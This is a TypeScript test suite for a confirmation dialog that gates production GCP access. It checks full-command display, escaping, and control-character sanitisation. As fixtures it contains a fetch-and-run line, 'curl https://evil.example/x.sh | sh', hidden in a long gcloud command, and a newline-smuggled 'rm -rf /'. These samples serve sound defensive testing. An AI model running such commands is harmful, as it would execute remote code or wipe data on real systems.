import { describe, expect, test } from "bun:test";
import { createConfirmModule, type ConfirmOptions } from "../../gate/confirm.ts";
import { createPendingQueue } from "../../gate/pending.ts";
import { describeCommand, type CommandDisplay } from "../../gate/summarize-command.ts";

/** What a spawned dialog received. */
interface Capture {
  cmd: string[];
  opts?: { stdin?: "pipe" | "inherit" };
  /** Everything written to the child's stdin, concatenated. */
  stdin: string;
  killed: boolean;
}

function newCapture(): Capture {
  return { cmd: [], opts: undefined, stdin: "", killed: false };
}

/**
 * Mock spawn that records the command, options, and stdin, then exits with the
 * given code. Pass `hang: true` to model a dialog that never returns.
 */
function mockSpawn(
  exitCode: number,
  capture: Capture = newCapture(),
  hang = false,
  stderrText?: string,
): NonNullable<ConfirmOptions["spawn"]> {
  return (cmd, opts) => {
    capture.cmd = cmd;
    capture.opts = opts;
    return {
      exited: hang ? new Promise<number>(() => {}) : Promise.resolve(exitCode),
      pid: 12345,
      stdin: {
        write: (chunk: string) => {
          capture.stdin += chunk;
          return chunk.length;
        },
        end: () => 0,
      },
      stdout: null,
      stderr:
        stderrText === undefined
          ? null
          : new ReadableStream<Uint8Array>({
              start(controller) {
                controller.enqueue(new TextEncoder().encode(stderrText));
                controller.close();
              },
            }),
      exitCode: null,
      signalCode: null,
      killed: false,
      kill: () => {
        capture.killed = true;
      },
      ref: () => {},
      unref: () => {},
      [Symbol.asyncDispose]: async () => {},
    } as unknown as ReturnType<typeof Bun.spawn>;
  };
}

/** Build a CommandDisplay the way the gate does, from a raw argv. */
function display(argv: string[]): CommandDisplay {
  const result = describeCommand(argv);
  if (!result) throw new Error("describeCommand returned undefined");
  return result;
}

/**
 * A command whose dangerous argument sits well past the 80-character summary
 * boundary. This is the shape of the bug this module exists to prevent: the
 * old dialog showed a truncated one-liner, so the payload was invisible.
 */
const HIDDEN_PAYLOAD = "--command=curl https://evil.example/x.sh | sh";
const LONG_COMMAND = [
  "/usr/bin/gcloud",
  "compute",
  "ssh",
  "bastion-01",
  "--zone=us-central1-a",
  "--tunnel-through-iap",
  "--project=some-fairly-long-project-name",
  HIDDEN_PAYLOAD,
];

describe("createConfirmModule", () => {
  describe("zenity approval", () => {
    test("returns true when zenity exits with 0", async () => {
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0),
        platform: "linux",
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(true);
    });

    test("returns false when zenity exits with 1 (denied)", async () => {
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(1),
        platform: "linux",
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(false);
    });

    test("returns false when zenity exits with 5 (timeout)", async () => {
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(5),
        platform: "linux",
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(false);
    });
  });

  describe("zenity not available", () => {
    test("returns false when zenity exits 127 and stdin is not TTY", async () => {
      // When zenity exits 127 (not found) and stdin is not TTY, should deny
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(127),
        platform: "linux",
        isTTY: false,
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(false);
    });
  });

  describe("spawn passes correct arguments", () => {
    test("passes correct zenity arguments with no command", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      await confirmProdAccess("user@example.com");

      expect(capture.cmd[0]).toBe("zenity");
      expect(capture.cmd).toContain("--question");
      expect(capture.cmd).toContain("--no-markup");
      expect(capture.cmd).toContain("--title=gcp-gate: Prod Access");
      expect(capture.cmd.some((arg) => arg.includes("user@example.com"))).toBe(true);
      expect(capture.cmd).toContain("--width=500");
      expect(capture.cmd).toContain("--timeout=60");
    });
  });

  describe("osascript approval (macOS)", () => {
    test("returns true when osascript exits with 0", async () => {
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0),
        platform: "darwin",
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(true);
    });

    test("returns false when osascript exits with 1 (denied)", async () => {
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(1),
        platform: "darwin",
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(false);
    });
  });

  describe("osascript not available", () => {
    test("returns false when osascript exits 127 and stdin is not TTY", async () => {
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(127),
        platform: "darwin",
        isTTY: false,
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(false);
    });
  });

  describe("osascript arguments and escaping", () => {
    test("passes correct osascript arguments with no command", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "darwin",
      });
      await confirmProdAccess("user@example.com");

      expect(capture.cmd[0]).toBe("osascript");
      expect(capture.cmd).toContain("-e");
      expect(capture.cmd.some((arg) => arg.includes("display dialog"))).toBe(true);
      expect(capture.cmd.some((arg) => arg.includes('default button "Deny"'))).toBe(true);
      expect(capture.cmd.some((arg) => arg.includes("user@example.com"))).toBe(true);
    });

    test("escapes double quotes in email", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "darwin",
      });
      await confirmProdAccess('user"@example.com');

      const scriptArg = capture.cmd.find((arg) => arg.includes("display dialog"));
      expect(scriptArg).toBeDefined();
      expect(scriptArg).toContain('user\\"@example.com');
    });

    test("escapes backslashes in email", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "darwin",
      });
      await confirmProdAccess("user\\@example.com");

      const scriptArg = capture.cmd.find((arg) => arg.includes("display dialog"));
      expect(scriptArg).toBeDefined();
      expect(scriptArg).toContain("user\\\\@example.com");
    });
  });

  describe("command display in zenity", () => {
    test("uses a scrollable text-info dialog when a command is provided", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      await confirmProdAccess("user@example.com", display(["gcloud", "compute", "instances"]));

      expect(capture.cmd[0]).toBe("zenity");
      expect(capture.cmd).toContain("--text-info");
      expect(capture.cmd).not.toContain("--question");
      expect(capture.cmd).toContain("--ok-label=Allow");
      expect(capture.cmd).toContain("--cancel-label=Deny");
      expect(capture.cmd).toContain("--checkbox=I have read the full command");
      expect(capture.cmd).toContain("--timeout=60");
      expect(capture.opts?.stdin).toBe("pipe");
    });

    test("never renders the command as markup or lets the operator edit it", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      await confirmProdAccess("user@example.com", display(["gcloud", "<b>bold</b>"]));

      expect(capture.cmd).not.toContain("--html");
      expect(capture.cmd).not.toContain("--editable");
    });

    test("pipes the question and every argument on stdin", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      await confirmProdAccess("user@example.com", display(["gcloud", "compute", "instances"]));

      expect(capture.stdin).toContain("Grant prod-level GCP access to user@example.com?");
      expect(capture.stdin).toContain("Full command (3 arguments):");
      expect(capture.stdin).toContain("gcloud");
      expect(capture.stdin).toContain("compute");
      expect(capture.stdin).toContain("instances");
      // The command must not reach argv, where it could be read by anyone
      // running `ps`, nor a temp file.
      expect(capture.cmd.some((arg) => arg.includes("instances"))).toBe(false);
    });

    test("shows an argument that falls past the old 80-character summary cut", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      await confirmProdAccess("user@example.com", display(LONG_COMMAND));

      expect(capture.stdin).toContain(HIDDEN_PAYLOAD);
      expect(capture.stdin).not.toContain("…");
      for (const arg of LONG_COMMAND.slice(1)) {
        expect(capture.stdin).toContain(arg);
      }
    });

    test("includes the PAM entitlement in the piped body", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      await confirmProdAccess("user@example.com", display(["gcloud"]), "prod-breakglass");

      expect(capture.stdin).toContain("via PAM entitlement 'prod-breakglass'");
    });

    test("omits command wording from zenity text when not provided", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      await confirmProdAccess("user@example.com");

      const textArg = capture.cmd.find((arg) => arg.startsWith("--text="));
      expect(textArg).toBeDefined();
      expect(textArg).not.toContain("Full command");
      expect(capture.opts?.stdin).toBeUndefined();
    });
  });

  describe("command display in osascript", () => {
    test("uses a scrollable list when a command is provided", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "darwin",
      });
      await confirmProdAccess("user@example.com", display(["terraform", "apply"]));

      expect(capture.stdin).toContain("choose from list");
      expect(capture.stdin).toContain('OK button name "Allow"');
      expect(capture.stdin).toContain('cancel button name "Deny"');
      expect(capture.stdin).toContain("terraform");
      expect(capture.stdin).toContain("apply");
      expect(capture.stdin).not.toContain("display dialog");
    });

    test("feeds the script on stdin so the command never reaches the process table", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "darwin",
      });
      await confirmProdAccess("user@example.com", display(LONG_COMMAND));

      // `osascript -` reads the script from stdin. Passing it via -e would put
      // every argument in argv, where any local user could read it out of `ps`
      // while the dialog is open.
      expect(capture.cmd).toEqual(["osascript", "-"]);
      expect(capture.opts?.stdin).toBe("pipe");
      for (const arg of LONG_COMMAND.slice(1)) {
        expect(capture.cmd.some((a) => a.includes(arg))).toBe(false);
      }
    });

    test("requires a selection so Return cannot approve by accident", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "darwin",
      });
      await confirmProdAccess("user@example.com", display(["terraform", "apply"]));

      // Both clauses are needed. AppleScript selects the first row by default,
      // which would leave the renamed OK ("Allow") enabled AND make it the
      // default button — one stray Return would approve. `default items {}`
      // selects nothing; omitting `empty selection allowed` keeps Allow
      // disabled while nothing is selected.
      expect(capture.stdin).toContain("default items {}");
      expect(capture.stdin).not.toContain("empty selection allowed");
      expect(capture.stdin).toContain("Select any line to enable Allow.");
    });

    test("shows an argument that falls past the old 80-character summary cut", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "darwin",
      });
      await confirmProdAccess("user@example.com", display(LONG_COMMAND));

      expect(capture.stdin).toContain(HIDDEN_PAYLOAD);
      for (const arg of LONG_COMMAND.slice(1)) {
        expect(capture.stdin).toContain(arg);
      }
    });

    test("escapes command content in osascript to prevent injection", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "darwin",
      });
      await confirmProdAccess("user@example.com", display(["cmd", '"with quotes"', "back\\slash"]));

      expect(capture.stdin).toContain('\\"with quotes\\"');
      expect(capture.stdin).toContain("back\\\\slash");
    });

    test("omits the list when no command is provided", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "darwin",
      });
      await confirmProdAccess("user@example.com");

      expect(capture.cmd.some((arg) => arg.includes("choose from list"))).toBe(false);
      expect(capture.cmd.some((arg) => arg.includes("display dialog"))).toBe(true);
    });
  });

  describe("unusable GUI binary falls through", () => {
    // Exit code alone cannot carry this: zenity 4.0.1 exits 255 for an
    // unsupported option, and older builds exit 1 — the same code as "user
    // pressed Deny". Mapping either to a denial would silently break every
    // prod request on the host, with no fallback and no way to approve.
    const optionRejections: Array<[string, number, string]> = [
      // Verified against the zenity 4.0.1 on this host.
      [
        "zenity 4.x",
        255,
        "This option is not available. Please see --help for all possible usages.\n",
      ],
      ["GLib GOption", 1, "Unknown option --checkbox\n"],
    ];

    for (const [label, exitCode, stderr] of optionRejections) {
      test(`${label} option rejection is treated as unavailable, not as a denial`, async () => {
        const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
        const { confirmProdAccess } = createConfirmModule({
          spawn: mockSpawn(exitCode, newCapture(), false, stderr),
          platform: "linux",
          isTTY: false,
          pendingQueue,
        });

        const promise = confirmProdAccess("user@example.com", display(["gcloud", "auth"]));
        await new Promise((r) => setTimeout(r, 10));

        const pending = pendingQueue.list();
        expect(pending).toHaveLength(1);

        pendingQueue.approve(pending[0]!.id);
        expect(await promise).toBe(true);
      });
    }

    test("a plain exit 1 with no option complaint is still a denial", async () => {
      const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(1, newCapture(), false, ""),
        platform: "linux",
        isTTY: false,
        pendingQueue,
      });

      expect(await confirmProdAccess("user@example.com", display(["gcloud"]))).toBe(false);
      expect(pendingQueue.list()).toHaveLength(0);
    });
  });

  describe("dialog deadline", () => {
    test("kills the dialog and denies when it overruns the backstop", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture, true),
        platform: "linux",
        isTTY: false,
        dialogBackstopMs: 10,
      });

      const result = await confirmProdAccess("user@example.com", display(["gcloud"]));
      expect(result).toBe(false);
      expect(capture.killed).toBe(true);
    });

    test("kills an overrunning osascript dialog too", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture, true),
        platform: "darwin",
        isTTY: false,
        dialogBackstopMs: 10,
      });

      const result = await confirmProdAccess("user@example.com", display(["gcloud"]));
      expect(result).toBe(false);
      expect(capture.killed).toBe(true);
    });
  });

  describe("zenity unexpected exit code", () => {
    test("returns false for unexpected exit code (e.g. 2)", async () => {
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(2),
        platform: "linux",
        isTTY: false,
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(false);
    });
  });

  describe("osascript unexpected exit code", () => {
    test("returns false for unexpected exit code (e.g. 2)", async () => {
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(2),
        platform: "darwin",
        isTTY: false,
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(false);
    });
  });

  describe("GUI spawn throws", () => {
    test("falls through to terminal deny when spawn throws and no TTY", async () => {
      const spawnFn = () => {
        throw new Error("spawn ENOENT");
      };

      const { confirmProdAccess } = createConfirmModule({
        spawn: spawnFn as unknown as ConfirmOptions["spawn"],
        platform: "linux",
        isTTY: false,
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(false);
    });

    test("falls through to terminal deny when osascript spawn throws and no TTY", async () => {
      const spawnFn = () => {
        throw new Error("spawn ENOENT");
      };

      const { confirmProdAccess } = createConfirmModule({
        spawn: spawnFn as unknown as ConfirmOptions["spawn"],
        platform: "darwin",
        isTTY: false,
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(false);
    });
  });

  describe("platform routing", () => {
    test("uses osascript on darwin", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "darwin",
      });
      await confirmProdAccess("user@example.com");
      expect(capture.cmd[0]).toBe("osascript");
    });

    test("uses zenity on linux", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      await confirmProdAccess("user@example.com");
      expect(capture.cmd[0]).toBe("zenity");
    });
  });

  describe("pending queue fallback", () => {
    test("enqueues when GUI exits 127 and no TTY, with pendingQueue", async () => {
      const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(127),
        platform: "linux",
        isTTY: false,
        pendingQueue,
      });

      const promise = confirmProdAccess("user@example.com", display(["gcloud", "compute", "list"]));

      // Yield to let the async GUI check resolve before inspecting the queue
      await new Promise((r) => setTimeout(r, 10));

      const pending = pendingQueue.list();
      expect(pending).toHaveLength(1);
      expect(pending[0]!.email).toBe("user@example.com");
      expect(pending[0]!.command?.summary).toBe("gcloud compute list");
      // The queue keeps the whole command, not just the summary, so the
      // operator can read it via `gcp-authcalator pending`.
      expect(pending[0]!.command?.argv).toEqual(["gcloud", "compute", "list"]);

      pendingQueue.approve(pending[0]!.id);
      expect(await promise).toBe(true);
    });

    test("keeps arguments past the summary cut in the queued request", async () => {
      const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(127),
        platform: "linux",
        isTTY: false,
        pendingQueue,
      });

      const promise = confirmProdAccess("user@example.com", display(LONG_COMMAND));
      await new Promise((r) => setTimeout(r, 10));

      const req = pendingQueue.list()[0]!;
      expect(req.command?.argv).toContain(HIDDEN_PAYLOAD);
      expect(req.command?.summary).not.toContain(HIDDEN_PAYLOAD);

      pendingQueue.deny(req.id);
      await promise;
    });

    test("enqueues when spawn throws and no TTY, with pendingQueue", async () => {
      const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
      const spawnFn = () => {
        throw new Error("spawn ENOENT");
      };

      const { confirmProdAccess } = createConfirmModule({
        spawn: spawnFn as unknown as ConfirmOptions["spawn"],
        platform: "linux",
        isTTY: false,
        pendingQueue,
      });

      const promise = confirmProdAccess("user@example.com");

      // Yield to let the async spawn error resolve before inspecting the queue
      await new Promise((r) => setTimeout(r, 10));

      const pending = pendingQueue.list();
      expect(pending).toHaveLength(1);

      pendingQueue.deny(pending[0]!.id);
      expect(await promise).toBe(false);
    });

    test("still auto-denies when no TTY and no pendingQueue", async () => {
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(127),
        platform: "linux",
        isTTY: false,
      });
      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(false);
    });

    test("does not use pendingQueue when GUI succeeds", async () => {
      const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0),
        platform: "linux",
        isTTY: false,
        pendingQueue,
      });

      const result = await confirmProdAccess("user@example.com");
      expect(result).toBe(true);
      expect(pendingQueue.list()).toHaveLength(0);
    });

    test("passes pendingId through to pendingQueue.enqueue", async () => {
      const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
      const clientId = "c".repeat(32);
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(127),
        platform: "linux",
        isTTY: false,
        pendingQueue,
      });

      const promise = confirmProdAccess("user@example.com", display(["cmd"]), undefined, clientId);

      await new Promise((r) => setTimeout(r, 10));

      const pending = pendingQueue.list();
      expect(pending).toHaveLength(1);
      expect(pending[0]!.id).toBe(clientId);

      pendingQueue.approve(clientId);
      expect(await promise).toBe(true);
    });
  });

  describe("control-character sanitisation", () => {
    test("strips control characters from email in zenity --text", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      // Email with embedded ANSI escape and newline.
      await confirmProdAccess("user[31m@example.com\nspoofed");

      const text = capture.cmd.find((a) => a.startsWith("--text=")) ?? "";
      expect(text).not.toContain("");
      expect(text).not.toContain("\n@");
      expect(text).not.toMatch(/\nspoofed/);
    });

    test("strips control characters from pamPolicy in zenity --text", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      await confirmProdAccess("user@example.com", undefined, "policywith-bell");

      const text = capture.cmd.find((a) => a.startsWith("--text=")) ?? "";
      expect(text).not.toContain("");
    });

    test("an embedded newline cannot forge an extra line in the piped body", async () => {
      const capture = newCapture();
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(0, capture),
        platform: "linux",
      });
      await confirmProdAccess("user@example.com", display(["gcloud", "safe\n  9  rm -rf /"]));

      // Exactly one line per argument, plus the question and the heading.
      const argLines = capture.stdin.split("\n").filter((line) => /^\s+\d+\s{2}/.test(line));
      expect(argLines).toHaveLength(2);
      expect(capture.stdin).not.toContain("\n  9  rm -rf /");
    });

    test("strips control characters before forwarding to pending queue", async () => {
      const pendingQueue = createPendingQueue({ timeoutMs: 5000, now: () => 1_000_000 });
      const { confirmProdAccess } = createConfirmModule({
        spawn: mockSpawn(127),
        platform: "linux",
        isTTY: false,
        pendingQueue,
      });

      const promise = confirmProdAccess(
        "user[31m@example.com",
        display(["cmd", "arg[0m"]),
        "policy\nspoof",
      );
      await new Promise((r) => setTimeout(r, 10));

      const pending = pendingQueue.list();
      expect(pending).toHaveLength(1);
      const req = pending[0]!;
      expect(req.email).not.toContain("");
      expect(req.command?.argv.join(" ")).not.toContain("");
      expect(req.pamPolicy).not.toContain("\n");

      pendingQueue.deny(req.id);
      await promise;
    });
  });
});
